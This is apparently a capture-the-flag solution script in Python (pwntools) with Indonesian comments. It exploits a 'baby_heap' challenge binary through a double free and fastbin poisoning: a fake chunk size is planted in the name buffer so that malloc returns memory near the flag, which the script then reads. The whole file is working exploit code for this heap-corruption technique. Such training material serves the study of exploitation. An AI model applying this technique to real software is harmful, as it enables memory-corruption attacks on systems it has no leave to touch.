from pwn import *
elf = ELF("./baby_heap")
r = elf.process()
#r = remote("104.250.105.158",6001)

def createName(r,data):
    r.sendlineafter("[?] Choice : ",'1')
    r.sendlineafter("[?] Your Name : ",data)

def create(size,data):
    r.recvuntil('[?] Choice : ')
    r.sendline('2')
    r.recvuntil('Size : ')
    r.sendline(str(size))
    r.sendline(data)
    log.info("Membuat alokasi memory sebesar : " + str(len(data)))

def delete(r,bin):
    r.recvuntil('[?] Choice : ')
    r.sendline(str(4))
    r.sendlineafter('Index : ',str(bin))
    log.warning("melakukan free terhadap memory di index ke : " + str(bin))

def read(r,index):
    log.info("membaca data..")
    r.recvuntil('[?] Choice : ')
    r.sendline(str(3))
    r.recvuntil('Index : ')
    r.sendline(str(index))
    r.recvuntil('[+] Content : ')
    return r.recv(100).strip()

def exit_bin(r):
    r.recvuntil('[?] Choice : ')
    r.sendline(str(5))
    return r.recvline()
def main():
    log.info("preparing..")
    # buat data di heap dengan size yang sama pada content nama
    fill_heap_name = "a" * 80    # variabel ini berfungsi untuk menyimpan padding
    create(80,fill_heap_name)    # digunakan untuk melakukan malloc dengan size 80
    create(80,fill_heap_name)    # digunakan untuk melakukan malloc dengan size 80
    create(80,fill_heap_name)    # digunakan untuk melakukan malloc dengan size 80
    ###########################################################

    # bug double free
    delete(r,0)                 # free pada index pertama
    delete(r,1)                 # free pada index ke dua
    delete(r,0)                 # free pada index pertama

    # isi variabel nama
    p = ""                      # isi variabel nama
    p += "a" * 72
    p += p64(0x61)

    createName(r , p)
    fake_chunk_addres = 0x602160
    # mengisi chunk untuk mengakali malloc
    create(80,p64(fake_chunk_addres))
    create(80,"e" * 80)
    create(80,"f" * 80)

    # sekarang heap ada di stack dekat flag
    create(80,'A' * 15)

    # ambil flag
    log.info("raw output : " + read(r,6))
#    r.interactive()


if __name__ == '__main__':
    main()
